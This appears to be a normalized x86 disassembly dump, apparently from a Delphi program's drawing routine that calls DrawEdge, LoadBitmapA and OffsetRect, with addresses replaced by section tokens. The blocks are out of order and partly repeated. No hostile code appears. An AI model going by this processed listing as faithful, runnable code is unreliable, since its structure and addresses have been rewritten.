mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d4f4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4452af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42139c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41cd28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_441c2c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d4f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4223a0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d99c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_441f1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4f4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_444c18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41cff4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dbbc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d7ec
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41cd28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4030f8
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dbbc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_444c18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445757
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_443cdc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_444c18
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_445770
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_446078
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d4f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cd28
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042c0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d4f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_441c2c
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dbbc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d4f4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d4f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4223a0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_445bbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42139c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41cd28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_441c2c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d4f4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_444c18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
